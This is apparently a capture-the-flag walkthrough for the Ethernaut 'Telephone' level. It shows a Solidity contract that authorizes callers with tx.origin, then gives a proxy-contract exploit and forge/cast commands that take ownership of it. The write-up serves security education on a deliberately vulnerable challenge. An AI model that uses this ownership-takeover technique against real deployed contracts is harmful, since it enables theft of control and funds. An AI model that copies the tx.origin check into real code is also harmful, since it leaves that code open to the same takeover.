## Telephone Level Outline

**Difficulty : 1/10**

Claim ownership of the contract below to complete this level.

```solidity  
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

[Link to level on Ethernaut](https://ethernaut.openzeppelin.com/level/0x0b6F6CE4BCfB70525A31454292017F640C10c768)

## Solution
we need to send a transaction where `tx.origin != msg.sender`. To do this, we use a proxy contract to call the "changeOwner()" as tx.origin will equal our EOA and msg.sender will equal our deployed contract's address.

### Walkthrough

##### 1. Create a new [forge project](https://book.getfoundry.sh/projects/creating-a-new-project.html) with the following contract in `src` 
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Phone {
    Telephone telephone;

    constructor(address _telephoneAddr) {
       telephone = Telephone(_telephoneAddr);
    } 

    function changeOwner() public {
        telephone.changeOwner(msg.sender);
    }
}

interface Telephone {
    function changeOwner(address _owner) external;
}
```

##### 2. Deploy our new contract
```console
forge create src/Contract.sol:Phone --constructor-args $LEVEL_ADDRESS --private-key  $PRIVATE_KEY
```

##### 3. Call our newly deployed contract 
```console
cast send $DEPLOYED_ADDRESS "changeOwner()" --private-key=$PRIVATE_KEY 
```
> Replace $DEPLOYED_ADDRESS with the address of your deployed contract

## Further Reading

